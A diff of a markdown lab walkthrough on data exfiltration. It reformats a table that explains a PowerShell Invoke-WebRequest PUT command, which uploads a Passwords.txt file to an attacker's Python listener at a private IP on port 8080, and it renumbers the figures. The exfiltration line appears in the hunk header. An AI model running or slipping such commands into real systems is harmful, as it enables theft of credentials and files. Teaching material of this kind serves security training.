@@ -147,19 +147,45 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 # ⚠️ Make sure to change the IP address, port number, and file path to match your attack setup.
 ```
 
-### Command Breakdown below 
-| Component            | Purpose                                                   |
-|----------------------|-----------------------------------------------------------|
-| `powershell -c`      | Runs the command within PowerShell                        |
-| `Invoke-WebRequest`  | Sends HTTP requests; here it’s used to upload a file      |
-| `-Uri`               | The destination URL (your Python listener endpoint)       |
-| `-Method Put`        | HTTP method used to upload the file                       |
-| `-InFile`            | Specifies the local file path to be uploaded              |
+<div align="left">
+  <sub><strong>(Figure 11)</strong></sub><br>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Component</th>
+        <th>Purpose</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>powershell -c</code></td>
+        <td>Runs the command within PowerShell</td>
+      </tr>
+      <tr>
+        <td><code>Invoke-WebRequest</code></td>
+        <td>Sends HTTP requests; here it’s used to upload a file</td>
+      </tr>
+      <tr>
+        <td><code>-Uri</code></td>
+        <td>The destination URL (your Python listener endpoint)</td>
+      </tr>
+      <tr>
+        <td><code>-Method Put</code></td>
+        <td>HTTP method used to upload the file</td>
+      </tr>
+      <tr>
+        <td><code>-InFile</code></td>
+        <td>Specifies the local file path to be uploaded</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
 
 
 
-*In Figure 11, you can see in the second terminal and is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*<br>
-<br><sub>(Figure 11)</sub><br>
+*In Figure 12, you can see in the second terminal and is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*<br>
+<br><sub>(Figure 12)</sub><br>
 <img src="analysis/screenshots_v1/Figure_11.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
 
 ---
